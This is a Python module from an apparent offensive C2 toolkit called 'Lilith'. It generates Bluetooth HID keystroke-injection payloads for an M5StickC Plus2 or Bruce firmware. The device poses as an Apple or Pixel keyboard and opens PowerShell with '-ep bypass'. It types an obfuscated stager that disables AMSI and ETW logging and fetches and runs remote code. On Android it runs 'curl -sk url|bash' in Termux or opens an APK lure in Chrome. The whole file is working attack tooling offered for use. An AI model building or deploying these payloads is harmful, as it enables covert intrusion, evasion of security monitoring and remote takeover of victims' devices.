"""
Lilith — BLE HID keystroke injection payload generator (M5StickC Plus2)

Two supported modes:

  m5stick — Custom Arduino sketch (ESP32-BLE-Keyboard + M5StickCPlus2 libs).
            Full UI: READY/FIRE/DONE on LCD, Button A trigger, Button B re-arm.
            Requires Arduino IDE compile + flash.

  bruce   — DuckyScript .txt payload for Bruce firmware (pr3y/Bruce).
            No compile step — copy to SD card /BadBLE/, select from Bruce menu.
            Bruce handles BLE advertisement, pairing, and keystroke injection.
            Fastest to deploy; Bruce is the standard choice for M5StickC Plus2.

Payload split (both modes):
  line1 = L1+L2+L3 (ZWSP setup + XOR key + AMSI bypass)
  line2 = L4-L10   (URL decode + TCP/TLS + fetch + ScriptBlock exec)
"""

import os
import re

from .stager import _compact_exec_loader

_BLE_CHUNK   = 80    # chars per print() call — keeps Windows BLE RX buffer happy
_BLE_GAP_MS  = 30   # ms between chunks
_DIALOG_MS   = 700  # Win+R dialog open
_PS_READY_MS = 1800 # PowerShell cold-start
_LINE_MS     = 400  # pause between line1 and line2
_EXIT_MS     = 2500 # wait for stager to launch before closing PS

# Android timing constants (UI is slower than Win32 desktop, more variance)
_AND_SETTLE_MS  = 3000  # wait after BtnA press before first keystroke
_AND_DISMISS_MS = 300   # between ESC presses to clear popups/overlays
_AND_HOME_MS    = 1800  # wait after META/Home key for launcher to appear
_AND_SEARCH_MS  = 900   # wait after typing app name before pressing Enter
_AND_CHROME_MS  = 4500  # wait for Chrome to fully open (cold start ~3-4s)
_AND_TERMUX_MS  = 5500  # wait for Termux to fully open (may need package init)
_AND_CTLL_MS    = 700   # wait after Ctrl+L for address bar focus animation


def _esc_c(s: str) -> str:
    return s.replace("\\", "\\\\").replace('"', '\\"')


def _chunked_prints(text: str, chunk: int = _BLE_CHUNK, gap: int = _BLE_GAP_MS) -> str:
    parts = []
    for i in range(0, len(text), chunk):
        piece = _esc_c(text[i:i + chunk])
        parts.append(f'  bleKbd.print("{piece}");')
        parts.append(f"  delay({gap});")
    return "\n".join(parts)


def _ble_m5stick(line1: str, line2: str, ble_name: str) -> str:
    l1_code = _chunked_prints(line1)
    l2_code = _chunked_prints(line2)

    return (
        "// Lilith BLE HID — M5StickC Plus2\n"
        "// Board  : M5StickC Plus2 (ESP32-S3)\n"
        "// Libs   : ESP32 BLE Keyboard (T-vK) + M5StickCPlus2\n\n"
        "#include <BleKeyboard.h>\n"
        "#include <M5StickCPlus2.h>\n\n"
        f'BleKeyboard bleKbd("{ble_name}", "Apple Inc.", 85);\n\n'
        "bool fired = false;\n\n"
        "void cls(uint16_t bg = BLACK) {\n"
        "  M5.Lcd.fillScreen(bg);\n"
        "  M5.Lcd.setCursor(0, 10);\n"
        "  M5.Lcd.setTextColor(WHITE);\n"
        "}\n\n"
        "void setup() {\n"
        "  M5.begin();\n"
        "  M5.Lcd.setRotation(3);\n"
        "  M5.Lcd.setTextSize(2);\n"
        "  cls();\n"
        '  M5.Lcd.println("LILITH BLE");\n'
        '  M5.Lcd.println("init...");\n'
        "  bleKbd.begin();\n"
        "}\n\n"
        "void loop() {\n"
        "  M5.update();\n\n"
        "  // No BLE connection — show pairing hint\n"
        "  if (!bleKbd.isConnected()) {\n"
        "    cls();\n"
        '    M5.Lcd.println("LILITH BLE");\n'
        f'    M5.Lcd.println("{ble_name}");\n'
        "    M5.Lcd.setTextColor(YELLOW);\n"
        '    M5.Lcd.println("pair target now");\n'
        "    M5.Lcd.setTextColor(WHITE);\n"
        "    fired = false;\n"
        "    delay(1500);\n"
        "    return;\n"
        "  }\n\n"
        "  // Connected and not yet fired — show ready state\n"
        "  if (!fired) {\n"
        "    cls();\n"
        '    M5.Lcd.println("LILITH BLE");\n'
        "    M5.Lcd.setTextColor(GREEN);\n"
        '    M5.Lcd.println("READY");\n'
        "    M5.Lcd.setTextColor(WHITE);\n"
        '    M5.Lcd.println("A = fire");\n'
        "  }\n\n"
        "  // Button A — inject payload\n"
        "  if (M5.BtnA.wasPressed() && !fired) {\n"
        "    fired = true;\n"
        "    cls(0x1082);\n"
        "    M5.Lcd.setTextColor(RED);\n"
        '    M5.Lcd.println("FIRING");\n'
        "    M5.Lcd.setTextColor(WHITE);\n\n"
        "    // Win+R\n"
        "    bleKbd.press(KEY_LEFT_GUI);\n"
        "    bleKbd.press('r');\n"
        "    delay(150);\n"
        "    bleKbd.releaseAll();\n"
        f"    delay({_DIALOG_MS});\n\n"
        "    // Open hidden PowerShell\n"
        '    bleKbd.print("powershell -ep bypass");\n'
        "    bleKbd.write(KEY_RETURN);\n"
        f"    delay({_PS_READY_MS});\n\n"
        "    // L1-L3: ZWSP type setup + XOR key + AMSI bypass\n"
        f"{l1_code}\n"
        "    bleKbd.write(KEY_RETURN);\n"
        f"    delay({_LINE_MS});\n\n"
        "    // L4-L10: URL decode + TLS fetch + ScriptBlock exec\n"
        f"{l2_code}\n"
        "    bleKbd.write(KEY_RETURN);\n"
        f"    delay({_EXIT_MS});\n\n"
        '    bleKbd.print("exit");\n'
        "    bleKbd.write(KEY_RETURN);\n\n"
        "    cls();\n"
        "    M5.Lcd.setTextColor(GREEN);\n"
        '    M5.Lcd.println("DONE");\n'
        "    M5.Lcd.setTextColor(WHITE);\n"
        '    M5.Lcd.println("~30s for session");\n'
        "  }\n\n"
        "  // Button B — reset fired flag (re-arm without re-pairing)\n"
        "  if (M5.BtnB.wasPressed()) {\n"
        "    fired = false;\n"
        "  }\n\n"
        "  delay(50);\n"
        "}\n"
    )


_BRUCE_MAX_STRING = 440  # Bruce firmware STRING buffer safety ceiling


def _bruce_split_arrays(ps1: str, max_elems: int = 55) -> list:
    """Break (&$dec @(n,...)) calls with >max_elems into temp-var pre-assignments.

    Turns:  $x=f((&$dec @(127,109,...133 nums...)))
    Into:   $dec0=@(127,...66 nums...); $dec0+=@(...67 nums...); $x=f((&$dec $dec0))

    This shrinks the long $req=GetBytes(...) statement from ~600 chars to ~150.
    """
    pre, ctr = [], [0]

    def _sub(m):
        dec_var, nums_str = m.group(1), m.group(2)
        nums = [n.strip() for n in nums_str.split(',')]
        if len(nums) <= max_elems:
            return m.group(0)
        tmp = f'{dec_var}{ctr[0]}'
        ctr[0] += 1
        half = len(nums) // 2
        pre.append(f'{tmp}=@({",".join(nums[:half])})')
        pre.append(f'{tmp}+=@({",".join(nums[half:])})')
        return f'(&{dec_var} {tmp})'

    new_stmt = re.sub(r'\(&(\$\w+) @\(([0-9,\s]+)\)\)', _sub, ps1)
    return pre + [new_stmt]


def _bruce_chunks(ps1: str, max_len: int = _BRUCE_MAX_STRING) -> list:
    """Split a semicolon-joined PS1 one-liner into chunks of at most max_len chars.

    Splits only at top-level semicolons (not inside braces/parens/brackets) so
    each chunk is a valid standalone set of PS1 statements. Bruce firmware has an
    internal STRING buffer; lines longer than ~512 bytes get silently truncated.
    """
    if len(ps1) <= max_len:
        return [ps1]
    # Collect individual top-level statements
    stmts, cur, depth = [], '', 0
    for ch in ps1:
        if ch in '({[':
            depth += 1
        elif ch in ')}]':
            depth -= 1
        if ch == ';' and depth == 0:
            if cur.strip():
                stmts.append(cur.strip())
            cur = ''
        else:
            cur += ch
    if cur.strip():
        stmts.append(cur.strip())
    # Greedily join statements into chunks of ≤ max_len
    chunks, cur_chunk = [], ''
    for stmt in stmts:
        if not cur_chunk:
            cur_chunk = stmt
        elif len(cur_chunk) + 1 + len(stmt) <= max_len:
            cur_chunk += ';' + stmt
        else:
            chunks.append(cur_chunk)
            cur_chunk = stmt
    if cur_chunk:
        chunks.append(cur_chunk)
    return chunks if chunks else [ps1]


def _bruce(lines: list, ble_name: str) -> str:
    """DuckyScript payload for Bruce firmware BadBLE.

    Each of the 10 stager lines is typed individually (STRING + ENTER).
    ZWSP/invisible Unicode in L1+L2 cannot be typed via BLE HID — strip them.
    After stripping, _zwsp_type()-generated type names appear as:
        ("System.Management.Automation.AmsiUtils" -replace "[^\x00-\x7F]","")
    which is a double-quoted string — the single-quote replace below would never
    match. We replace the entire _zwsp_type construct with PS1 string-concat
    so no recognisable identifier appears in the Bruce DuckyScript output.
    Long lines (L8≈724, L9≈550) are split at top-level semicolons to avoid
    hitting the firmware STRING buffer limit (~512 bytes).
    """
    out = [
        "REM Lilith C2 stager - Bruce BadBLE",
        f"REM BLE name set in Bruce settings (current: {ble_name})",
        "REM Copy to SD card: /BadBLE/lilith.txt",
        "REM Bruce menu: BadBLE -> select lilith.txt -> run",
        "",
        "GUI r",
        f"DELAY {_DIALOG_MS}",
        "STRING powershell -ep bypass",
        "ENTER",
        f"DELAY {_PS_READY_MS}",
    ]
    for i, line in enumerate(lines):
        clean = re.sub(r'[^\x00-\x7f]', '', line)
        # Re-obfuscate AMSI/ETW sentinel type names.
        # _zwsp_type() wraps them in double-quoted strings with a no-op -replace;
        # after ZWSP strip that becomes: ("TYPE_NAME" -replace "[^\x00-\x7F]","")
        # Replace the whole construct with PS1 string concatenation so the type
        # name never appears as a contiguous literal in the DuckyScript output.
        for _plain, _split in (
            ("System.Management.Automation.AmsiUtils",
             "('Sys'+'tem.Manage'+'ment.Auto'+'mation.Amsi'+'Utils')"),
            ("System.Management.Automation.PSEtwLogProvider",
             "('Sys'+'tem.Manage'+'ment.Auto'+'mation.PSEtw'+'LogPro'+'vider')"),
        ):
            if _plain in clean:
                # Single-quoted form (e.g. direct GetType call literals)
                clean = clean.replace(f"'{_plain}'", _split)
                # Double-quoted form produced by _zwsp_type after ZWSP strip
                clean = clean.replace(
                    f'("{_plain}" -replace "[^\\x00-\\x7F]","")',
                    _split,
                )
        for chunk in _bruce_chunks(clean):
            # Second pass: if a single indivisible statement is still too long
            # (e.g. $req=GetBytes(...+&$dec @(133 nums)+...)), split large XOR
            # arrays into temp-var pre-assignments to bring the line under limit.
            sub = _bruce_split_arrays(chunk) if len(chunk) > _BRUCE_MAX_STRING else [chunk]
            for sc in sub:
                out.append(f"STRING {sc}")
                out.append("ENTER")
                out.append(f"DELAY {_LINE_MS}")
    out += [
        f"DELAY {_EXIT_MS}",
        "STRING exit",
        "ENTER",
    ]
    return "\n".join(out)


def _bruce_android(url: str, mode: str = "chrome") -> str:
    """DuckyScript for Bruce firmware targeting an Android device.

    mode='chrome'  — opens Chrome and navigates to url
    mode='termux'  — opens Termux and runs: curl -sk url|bash
    """
    if mode == "termux":
        curl_cmd = f"curl -sk {url}|bash"
        body = [
            f"DELAY {_AND_SETTLE_MS}",
            "ESCAPE",
            f"DELAY {_AND_DISMISS_MS}",
            "ESCAPE",
            f"DELAY {_AND_DISMISS_MS}",
            "GUI",
            f"DELAY {_AND_HOME_MS}",
            "STRING termux",
            f"DELAY {_AND_SEARCH_MS}",
            "ENTER",
            f"DELAY {_AND_TERMUX_MS}",
            f"STRING {curl_cmd}",
            "ENTER",
        ]
        header_comment = "BadBLE Android - Termux shell stager"
        tip = "Requires Termux installed on target"
    else:
        body = [
            f"DELAY {_AND_SETTLE_MS}",
            "ESCAPE",
            f"DELAY {_AND_DISMISS_MS}",
            "ESCAPE",
            f"DELAY {_AND_DISMISS_MS}",
            "GUI",
            f"DELAY {_AND_HOME_MS}",
            "STRING chrome",
            f"DELAY {_AND_SEARCH_MS}",
            "ENTER",
            f"DELAY {_AND_CHROME_MS}",
            "CTRL l",
            f"DELAY {_AND_CTLL_MS}",
            f"STRING {url}",
            "ENTER",
        ]
        header_comment = "BadBLE Android - Chrome URL navigation"
        tip = "Opens Chrome and downloads Android payload"

    lines = [
        f"REM Lilith {header_comment}",
        f"REM {tip}",
        "REM Screen must be ON and UNLOCKED",
        "REM BLE name: set in Bruce settings",
        "REM Copy to SD: /BadBLE/lilith_android.txt",
        "",
    ] + body
    return "\n".join(lines)


def _m5stick_android(url: str, ble_name: str, mode: str = "chrome") -> str:
    """Arduino sketch for M5StickC Plus2 targeting an Android device.

    mode='chrome'  — GUI → launcher search "chrome" → Enter → Ctrl+L → URL → Enter
    mode='termux'  — GUI → launcher search "termux" → Enter → curl cmd → Enter
    """
    if mode == "termux":
        curl_cmd = url   # url is the full curl command string for termux mode
        fire_code = (
            f"    delay({_AND_SETTLE_MS});\n"
            "\n"
            "    // Dismiss overlays\n"
            "    for (int i = 0; i < 2; i++) {\n"
            "      bleKbd.write(KEY_ESC);\n"
            f"      delay({_AND_DISMISS_MS});\n"
            "    }\n"
            "\n"
            "    // Home screen\n"
            "    bleKbd.press(KEY_LEFT_GUI);\n"
            "    delay(120);\n"
            "    bleKbd.releaseAll();\n"
            f"    delay({_AND_HOME_MS});\n"
            "\n"
            "    // Open Termux\n"
            '    bleKbd.print("termux");\n'
            f"    delay({_AND_SEARCH_MS});\n"
            "    bleKbd.write(KEY_RETURN);\n"
            f"    delay({_AND_TERMUX_MS});\n"
            "\n"
            "    // Run stager\n"
            f'    bleKbd.print("{_esc_c(curl_cmd)}");\n'
            "    bleKbd.write(KEY_RETURN);\n"
        )
        done_msg = '"~30s for session"'
        mode_label = "TERMUX"
    else:
        fire_code = (
            f"    delay({_AND_SETTLE_MS});\n"
            "\n"
            "    // Dismiss overlays\n"
            "    for (int i = 0; i < 2; i++) {\n"
            "      bleKbd.write(KEY_ESC);\n"
            f"      delay({_AND_DISMISS_MS});\n"
            "    }\n"
            "\n"
            "    // Home screen\n"
            "    bleKbd.press(KEY_LEFT_GUI);\n"
            "    delay(120);\n"
            "    bleKbd.releaseAll();\n"
            f"    delay({_AND_HOME_MS});\n"
            "\n"
            "    // Open Chrome via launcher search\n"
            '    bleKbd.print("chrome");\n'
            f"    delay({_AND_SEARCH_MS});\n"
            "    bleKbd.write(KEY_RETURN);\n"
            f"    delay({_AND_CHROME_MS});\n"
            "\n"
            "    // Focus Chrome address bar (Ctrl+L)\n"
            "    bleKbd.press(KEY_LEFT_CTRL);\n"
            "    bleKbd.press(KEY_L);\n"
            "    bleKbd.releaseAll();\n"
            f"    delay({_AND_CTLL_MS});\n"
            "\n"
            "    // Navigate to payload page\n"
            f'    bleKbd.print("{_esc_c(url)}");\n'
            "    bleKbd.write(KEY_RETURN);\n"
        )
        done_msg = '"tap install"'
        mode_label = "CHROME"

    return (
        "// Lilith BLE HID — M5StickC Plus2 → Android\n"
        "// Board  : M5StickC Plus2 (ESP32-S3)\n"
        "// Libs   : ESP32 BLE Keyboard (T-vK) + M5StickCPlus2\n"
        f"// Mode   : Android {mode_label}\n\n"
        "#include <BleKeyboard.h>\n"
        "#include <M5StickCPlus2.h>\n\n"
        f'BleKeyboard bleKbd("{ble_name}", "Google", 85);\n\n'
        "bool fired = false;\n\n"
        "void cls(uint16_t bg = BLACK) {\n"
        "  M5.Lcd.fillScreen(bg);\n"
        "  M5.Lcd.setCursor(0, 10);\n"
        "  M5.Lcd.setTextColor(WHITE);\n"
        "}\n\n"
        "void setup() {\n"
        "  M5.begin();\n"
        "  M5.Lcd.setRotation(3);\n"
        "  M5.Lcd.setTextSize(2);\n"
        "  cls();\n"
        '  M5.Lcd.println("LILITH BLE");\n'
        f'  M5.Lcd.println("ANDROID");\n'
        "  bleKbd.begin();\n"
        "}\n\n"
        "void loop() {\n"
        "  M5.update();\n\n"
        "  if (!bleKbd.isConnected()) {\n"
        "    cls();\n"
        '    M5.Lcd.println("LILITH BLE");\n'
        f'    M5.Lcd.println("{ble_name}");\n'
        "    M5.Lcd.setTextColor(YELLOW);\n"
        '    M5.Lcd.println("pair Android");\n'
        "    M5.Lcd.setTextColor(WHITE);\n"
        "    fired = false;\n"
        "    delay(1500);\n"
        "    return;\n"
        "  }\n\n"
        "  if (!fired) {\n"
        "    cls();\n"
        '    M5.Lcd.println("LILITH BLE");\n'
        "    M5.Lcd.setTextColor(GREEN);\n"
        '    M5.Lcd.println("READY");\n'
        "    M5.Lcd.setTextColor(WHITE);\n"
        f'    M5.Lcd.println("A = {mode_label}");\n'
        "  }\n\n"
        "  if (M5.BtnA.wasPressed() && !fired) {\n"
        "    fired = true;\n"
        "    cls(0x1082);\n"
        "    M5.Lcd.setTextColor(RED);\n"
        '    M5.Lcd.println("FIRING");\n'
        "    M5.Lcd.setTextColor(WHITE);\n\n"
        f"{fire_code}\n"
        "    cls();\n"
        "    M5.Lcd.setTextColor(GREEN);\n"
        '    M5.Lcd.println("DONE");\n'
        "    M5.Lcd.setTextColor(WHITE);\n"
        f'    M5.Lcd.println({done_msg});\n'
        "  }\n\n"
        "  if (M5.BtnB.wasPressed()) {\n"
        "    fired = false;\n"
        "  }\n\n"
        "  delay(50);\n"
        "}\n"
    )


_ANDROID_FILENAMES = {
    "m5stick": ("lilith_android.ino", "open lilith_android/ in Arduino IDE → M5StickC Plus2 → upload"),
    "bruce":   ("lilith_android.txt", "copy to SD /BadBLE/lilith_android.txt → Bruce → BadBLE → run"),
}

ANDROID_DEVICES = ("m5stick", "bruce")


def build_android_ble_payload(
    android_url:  str,
    output_dir:   str,
    device:       str = "bruce",
    ble_name:     str = "Pixel Accessories",
    mode:         str = "chrome",
) -> bool:
    """Generate BLE HID payload for M5StickC Plus2 targeting an Android device.

    android_url : URL to navigate Chrome to, OR base URL for curl command (termux mode)
    output_dir  : directory to write payload files into
    device      : 'm5stick' | 'bruce' | 'all'
    ble_name    : BLE device name advertised during pairing
    mode        : 'chrome' (navigate to APK lure) | 'termux' (open Termux, run stager)
    """
    os.makedirs(output_dir, exist_ok=True)

    if mode == "termux":
        curl_cmd = f"curl -sk {android_url}|bash"
    else:
        curl_cmd = android_url   # unused in chrome mode, but we use android_url directly

    targets = list(ANDROID_DEVICES) if device == "all" else [device]
    ok = False

    for dev in targets:
        if dev not in _ANDROID_FILENAMES:
            print(f"[!] Unknown BLE device '{dev}'  (valid: m5stick, bruce, all)")
            continue

        if dev == "bruce":
            content = _bruce_android(curl_cmd if mode == "termux" else android_url, mode)
        else:
            content = _m5stick_android(
                curl_cmd if mode == "termux" else android_url,
                ble_name, mode,
            )

        filename, note = _ANDROID_FILENAMES[dev]
        if dev == "m5stick":
            sketch_name = os.path.splitext(filename)[0]
            out_dir = os.path.join(output_dir, sketch_name)
            os.makedirs(out_dir, exist_ok=True)
        else:
            out_dir = output_dir

        path = os.path.join(out_dir, filename)
        with open(path, "w") as f:
            f.write(content)

        print(f"[+] {dev:<12} → {path}")
        print(f"    Deploy : {note}")
        ok = True

    if ok:
        print()
        total_s = (
            _AND_SETTLE_MS
            + 2 * _AND_DISMISS_MS
            + _AND_HOME_MS
            + _AND_SEARCH_MS
            + (_AND_TERMUX_MS if mode == "termux" else _AND_CHROME_MS)
            + (_AND_CTLL_MS if mode == "chrome" else 0)
        ) // 1000 + 2
        print(f"[*] Estimated execution time : ~{total_s}s")
        print(f"[*] Mode     : {mode}")
        print(f"[*] Target   : Android (screen ON + UNLOCKED required)")
        if mode == "chrome":
            print(f"[*] Flow     : HOME → launcher search 'chrome' → Ctrl+L → {android_url}")
            print(f"[*] Outcome  : Chrome opens and begins APK download; user taps Install")
        else:
            print(f"[*] Flow     : HOME → launcher search 'termux' → curl cmd")
            print(f"[*] Command  : {curl_cmd}")
            print(f"[*] Outcome  : ARM64 ELF payload executes in background, no user interaction")
        print()
        if "bruce" in targets:
            print(f"[*] Bruce    : BLE name is set in Bruce firmware settings menu")
            print(f"    Trigger  : Bruce menu → BadBLE → lilith_android.txt → run")
        if "m5stick" in targets:
            print(f"[*] M5StickC : BLE name advertised = '{ble_name}'")
            print(f"    Pair     : Android Bluetooth → Add device → '{ble_name}'")
            print(f"    Trigger  : Button A  |  Re-arm : Button B")

    return ok


DEVICES = ("m5stick", "bruce")

_FILENAMES = {
    "m5stick": ("lilith_ble.ino", "open lilith_ble/ folder in Arduino IDE → select M5StickC Plus2 → upload"),
    "bruce":   ("lilith.txt",     "copy to SD card /BadBLE/lilith.txt → Bruce menu: BadBLE → lilith.txt → run"),
}

_GENERATORS = {
    "m5stick": _ble_m5stick,
    "bruce":   _bruce,
}


def build_ble_payload(
    stager_url: str,
    output_dir: str,
    device:     str = "m5stick",
    ble_name:   str = "Apple Wireless Keyboard",
) -> bool:
    """Generate a BLE HID keystroke payload sketch for the M5StickC Plus2.

    stager_url : full HTTPS URL served by 'lilith serve'
    output_dir : directory to write the sketch folder into
    device     : 'm5stick' (only supported device for now)
    ble_name   : BLE device name shown on target's pairing dialog
    """
    os.makedirs(output_dir, exist_ok=True)

    lines = _compact_exec_loader(stager_url)
    split = next((i for i, l in enumerate(lines) if "param($b)" in l), None)
    if split is None:
        print("[!] _compact_exec_loader: could not locate decoder line")
        return False
    line1 = ";".join(lines[:split + 1])
    line2 = ";".join(lines[split + 1:])

    targets = DEVICES if device == "all" else (device,)
    ok = False

    for dev in targets:
        if dev not in _GENERATORS:
            print(f"[!] Unknown BLE device '{dev}'  (valid: m5stick, bruce)")
            continue

        # Bruce gets the raw 10-line list (types each line individually).
        # m5stick gets the pre-joined 2-string pair (fewer BLE round-trips).
        if dev == "bruce":
            content = _bruce(lines, ble_name)
        else:
            content = _GENERATORS[dev](line1, line2, ble_name)
        filename, note   = _FILENAMES[dev]
        if dev == "m5stick":
            # Arduino IDE requires .ino inside a folder matching the sketch name
            sketch_name  = os.path.splitext(filename)[0]
            out_dir      = os.path.join(output_dir, sketch_name)
            os.makedirs(out_dir, exist_ok=True)
        else:
            # Bruce: flat file, no subfolder needed
            out_dir      = output_dir
        path             = os.path.join(out_dir, filename)

        with open(path, "w") as f:
            f.write(content)

        print(f"[+] {dev:<12} → {path}")
        print(f"    Deploy : {note}")
        ok = True

    if ok:
        l2_chars    = len(line2)
        chunks      = (l2_chars + _BLE_CHUNK - 1) // _BLE_CHUNK
        ble_type_s  = round(chunks * _BLE_GAP_MS / 1000)
        total_s     = (_DIALOG_MS + _PS_READY_MS + _LINE_MS + _EXIT_MS) // 1000 + ble_type_s + 3
        print(f"\n[*] Execution time estimate : ~{total_s}s total  (line2={l2_chars} chars)")
        if "bruce" in targets:
            print(f"    BLE name : set inside Bruce settings menu (use --ble-name for reference only)")
            print(f"    Trigger  : Bruce menu → BadBLE → lilith.txt → run")
        if "m5stick" in targets:
            print(f"    BLE name : '{ble_name}'  (--ble-name to change)")
            print(f"    Pair     : target Bluetooth → Add device → '{ble_name}'")
            print(f"    Trigger  : Button A (front face)")
            print(f"    Re-arm   : Button B (side) resets fired state without re-pairing")

    return ok
